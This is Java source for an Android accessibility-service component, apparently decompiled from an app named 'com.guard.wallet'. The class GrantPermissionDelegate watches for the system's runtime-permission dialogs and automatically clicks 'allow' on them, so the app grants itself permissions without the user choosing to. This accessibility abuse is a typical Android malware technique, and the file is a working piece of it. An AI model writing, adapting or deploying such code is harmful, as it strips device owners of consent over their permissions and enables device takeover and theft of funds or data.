package com.guard.wallet.delegate;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.guard.wallet.req.ListenWindow;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * vendor o/l — GrantPermissionDelegate.
 * Monitors permission grant dialogs from both packageinstaller and permissioncontroller.
 * Auto-clicks "allow" when runtime permission dialog appears.
 */
public final class GrantPermissionDelegate extends AccessibilityDelegate {

    /** vendor o — synthetic constant (always 0) */
    public static final int __synthetic_0 = 0;

    /** vendor n — pending operation queue */
    public final ConcurrentLinkedQueue n = new ConcurrentLinkedQueue();

    public GrantPermissionDelegate() {
        super(J(), "com.android.permissioncontroller");
    }

    /**
     * vendor H() — build ListenWindow for packageinstaller GrantPermissionsActivity.
     * Listens for WINDOW_STATE_CHANGED (32) and WINDOW_CONTENT_CHANGED (16384).
     */
    public static ListenWindow H() {
        ListenWindow lw = new ListenWindow(null,
                "com.android.packageinstaller.permission.ui.GrantPermissionsActivity");
        FilterHelper.addEventType(16384, FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw), lw);
        return lw;
    }

    /**
     * vendor I() — build ListenWindow for permissioncontroller GrantPermissionsActivity.
     * Listens for WINDOW_STATE_CHANGED (32) and WINDOW_CONTENT_CHANGED (16384).
     */
    public static ListenWindow I() {
        ListenWindow lw = new ListenWindow(null,
                "com.android.permissioncontroller.permission.ui.GrantPermissionsActivity");
        FilterHelper.addEventType(16384, FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw), lw);
        return lw;
    }

    /** vendor J() — return LinkedList containing both permission grant windows */
    public static LinkedList J() {
        LinkedList list = new LinkedList();
        list.add(H());
        list.add(I());
        return list;
    }

    /** vendor d() — cleanup: cancel pending tasks, clear queue, call super */
    @Override
    public final void d() {
        com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
        this.n.clear();
        super.d();
    }

    /**
     * vendor u(event, packageName, className) — handle accessibility event.
     * If current window matches either permission grant dialog,
     * queue "allowInGrantPermission" task to auto-click allow button.
     */
    @Override
    public final void u(AccessibilityEvent event, String packageName, String className) {
        super.u(event, packageName, className);

        LinkedList windows = new LinkedList();
        windows.add(H());
        windows.add(I());

        boolean matched;
        if (this.q(windows)) {
            Log.d("o.l", "已进入是否允许权限申请窗口");
            matched = true;
        } else {
            matched = false;
        }

        if (matched) {
            ConcurrentLinkedQueue queue = this.n;
            if (!queue.contains("allowInGrantPermission")) {
                queue.add("allowInGrantPermission");
                com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.ConfirmLockRunnable(this, 2), super.c);
            }
        }
    }
}
